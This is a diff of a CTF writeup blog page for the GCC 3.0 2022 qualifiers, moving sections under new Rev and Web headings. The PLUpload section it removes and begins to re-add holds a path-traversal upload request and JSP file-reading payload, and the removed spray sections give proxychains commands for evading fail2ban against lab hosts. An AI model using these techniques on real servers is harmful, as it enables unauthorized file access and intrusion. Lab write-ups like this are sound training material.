@@ -87,7 +87,7 @@
           ·
         </span>
         <span>
-          2105 words
+          2115 words
         </span>
         <span class="split">
           ·
@@ -103,6 +103,7 @@
   <img src="https://pbs.twimg.com/media/FIxy9OTVcAA79W-?format=jpg&amp;name=4096x4096" alt=""  />
 </p>
 I&rsquo;m super happy on writing this writeup becaue I managed to qualify to join the final of GCC 3.0 2022. Here is my writeup for challenges that I solved during qualification. (Edit: I got third place on the final :D).</p>
+<h1 id="rev">Rev <a href="#rev" class="anchor">#</a></h1>
 <h2 id="regexp-challenge">Regexp Challenge <a href="#regexp-challenge" class="anchor">#</a></h2>
 <p>We just need to craft manually our regex per level</p>
 <ul>
@@ -256,234 +257,6 @@ I&rsquo;m super happy on writing this writeup becaue I managed to qualify to joi
 <blockquote>
 <p>Flag: GEIJBLDJDECA</p>
 </blockquote>
-<h2 id="plupload">PLUpload <a href="#plupload" class="anchor">#</a></h2>
-<p>I try to check <code>/examples</code> folder, and found out that this uses Apache Tomcat. After playing it for a while (especially on the upload feature), I notice that the upload feature doesn&rsquo;t sanitize <code>../</code>, which mean we can freely upload the file to any directories. Also inside the examples folder there are a lot of jsp file example that got executed.</p>
-<p>My solution is to upload a jsp file to the examples folder path (<code>/examples/jsp/jsp2/el</code>) where the jsp file will open <code>/var/gold.txt</code> file contents.</p>
-<p>Below is the jsp file</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.FileInputStream&#34;</span><span style="color:#555">%&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.File&#34;</span><span style="color:#555">%&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.InputStreamReader&#34;</span><span style="color:#555">%&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.net.URL&#34;</span><span style="color:#555">%&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.FileReader&#34;</span><span style="color:#555">%&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.BufferedReader&#34;</span><span style="color:#555">%&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> contentType<span style="color:#555">=</span><span style="color:#c30">&#34;text/html&#34;</span> pageEncoding<span style="color:#555">=</span><span style="color:#c30">&#34;UTF-8&#34;</span><span style="color:#555">%&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;!</span>DOCTYPE html<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;</span>html<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;</span>head<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;</span>meta http<span style="color:#555">-</span>equiv<span style="color:#555">=</span><span style="color:#c30">&#34;Content-Type&#34;</span> content<span style="color:#555">=</span><span style="color:#c30">&#34;text/html; charset=UTF-8&#34;</span><span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;</span>title<span style="color:#555">&gt;</span>Read Text<span style="color:#555">&lt;/</span>title<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;/</span>head<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;</span>body<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;%</span>
-</span></span><span style="display:flex;"><span>            String txtFilePath <span style="color:#555">=</span> <span style="color:#c30">&#34;/var/gold.txt&#34;</span><span style="color:#555">;</span>
-</span></span><span style="display:flex;"><span>            BufferedReader reader <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> BufferedReader<span style="color:#555">(</span><span style="color:#069;font-weight:bold">new</span> FileReader<span style="color:#555">(</span>txtFilePath<span style="color:#555">));</span>
-</span></span><span style="display:flex;"><span>            StringBuilder sb <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> StringBuilder<span style="color:#555">();</span>
-</span></span><span style="display:flex;"><span>            String line<span style="color:#555">;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">while</span><span style="color:#555">((</span>line <span style="color:#555">=</span> reader<span style="color:#555">.</span><span style="color:#309">readLine</span><span style="color:#555">())!=</span> <span style="color:#069;font-weight:bold">null</span><span style="color:#555">){</span>
-</span></span><span style="display:flex;"><span>                sb<span style="color:#555">.</span><span style="color:#309">append</span><span style="color:#555">(</span>line<span style="color:#555">+</span><span style="color:#c30">&#34;\n&#34;</span><span style="color:#555">);</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#555">}</span>
-</span></span><span style="display:flex;"><span>            out<span style="color:#555">.</span><span style="color:#309">println</span><span style="color:#555">(</span>sb<span style="color:#555">.</span><span style="color:#309">toString</span><span style="color:#555">());</span> 
-</span></span><span style="display:flex;"><span>        <span style="color:#555">%&gt;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;/</span>body<span style="color:#555">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#555">&lt;/</span>html<span style="color:#555">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Below is the upload request that I use to upload the jsp file to <code>../../examples/jsp/jsp2/el/cho.jsp</code></p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST //upload HTTP/1.1
-</span></span><span style="display:flex;"><span>Host: e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land
-</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
-</span></span><span style="display:flex;"><span>Accept: */*
-</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
-</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
-</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=---------------------------34999802810414628822789368601
-</span></span><span style="display:flex;"><span>Content-Length: 1479
-</span></span><span style="display:flex;"><span>Origin: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land
-</span></span><span style="display:flex;"><span>Connection: close
-</span></span><span style="display:flex;"><span>Referer: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land/
-</span></span><span style="display:flex;"><span>Cookie: JSESSIONID=6E2119D7A2763AC0C88B4888A10C0E8B
-</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: empty
-</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: cors
-</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
-</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;name&#34;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>../../examples/jsp/jsp2/el/cho.jsp
-</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
-</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;chunk&#34;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>0
-</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
-</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;chunks&#34;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>1
-</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
-</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;cho.jsp&#34;
-</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.FileInputStream&#34;%&gt;
-</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.File&#34;%&gt;
-</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.InputStreamReader&#34;%&gt;
-</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.net.URL&#34;%&gt;
-</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.FileReader&#34;%&gt;
-</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.BufferedReader&#34;%&gt;
-</span></span><span style="display:flex;"><span>&lt;%@page contentType=&#34;text/html&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
-</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
-</span></span><span style="display:flex;"><span>&lt;html&gt;
-</span></span><span style="display:flex;"><span>    &lt;head&gt;
-</span></span><span style="display:flex;"><span>        &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
-</span></span><span style="display:flex;"><span>        &lt;title&gt;Read Text&lt;/title&gt;
-</span></span><span style="display:flex;"><span>    &lt;/head&gt;
-</span></span><span style="display:flex;"><span>    &lt;body&gt;
-</span></span><span style="display:flex;"><span>        &lt;%
-</span></span><span style="display:flex;"><span>            String txtFilePath = &#34;/var/gold.txt&#34;;
-</span></span><span style="display:flex;"><span>            BufferedReader reader = new BufferedReader(new FileReader(txtFilePath));
-</span></span><span style="display:flex;"><span>            StringBuilder sb = new StringBuilder();
-</span></span><span style="display:flex;"><span>            String line;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            while((line = reader.readLine())!= null){
-</span></span><span style="display:flex;"><span>                sb.append(line+&#34;\n&#34;);
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>            out.println(sb.toString()); 
-</span></span><span style="display:flex;"><span>        %&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    &lt;/body&gt;
-</span></span><span style="display:flex;"><span>&lt;/html&gt;
-</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601--
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>After upload it, we can simply open the file
-<p class="markdown-image">
-  <img src="https://i.imgur.com/a0sHb0o.png" alt=""  />
-</p></p>
-<blockquote>
-<p>Flag: New is always better. - Barney Stinson</p>
-</blockquote>
-<h2 id="ctf-spray-attack-ssh">CTF Spray Attack SSH <a href="#ctf-spray-attack-ssh" class="anchor">#</a></h2>
-<p>With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used:</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains sshpass -p <span style="color:#f60">93370760</span> ssh -o <span style="color:#033">StrictHostKeyChecking</span><span style="color:#555">=</span>no user_100283@pwspray.vm.vuln.land -p <span style="color:#f60">22</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><p class="markdown-image">
-  <img src="https://i.imgur.com/mT0j5pe.png" alt=""  />
-</p></p>
-<h2 id="ctf-spray-attack-http">CTF Spray Attack HTTP <a href="#ctf-spray-attack-http" class="anchor">#</a></h2>
-<p>With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used:</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains curl --user user_140244:6ed42dd7 http://pwspray.vm.vuln.land -v
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><p class="markdown-image">
-  <img src="https://i.imgur.com/e3Yuq6D.png" alt=""  />
-</p></p>
 <h2 id="crack-me-android">Crack me Android <a href="#crack-me-android" class="anchor">#</a></h2>
 <p>I got an apk file, and I try to decompile it with the help of JDK. After reading the result I found the login code in the LoginViewModel.</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
@@ -714,6 +487,237 @@ So to generate the password (which is the flag), we just need to do:
 </div><blockquote>
 <p>Flag: HL{J4v4.nativ3.d0.n0t.c4r3}</p>
 </blockquote>
+<h1 id="web">Web <a href="#web" class="anchor">#</a></h1>
+<h2 id="plupload">PLUpload <a href="#plupload" class="anchor">#</a></h2>
+<p>I try to check <code>/examples</code> folder, and found out that this uses Apache Tomcat. After playing it for a while (especially on the upload feature), I notice that the upload feature doesn&rsquo;t sanitize <code>../</code>, which mean we can freely upload the file to any directories. Also inside the examples folder there are a lot of jsp file example that got executed.</p>
+<p>My solution is to upload a jsp file to the examples folder path (<code>/examples/jsp/jsp2/el</code>) where the jsp file will open <code>/var/gold.txt</code> file contents.</p>
+<p>Below is the jsp file</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
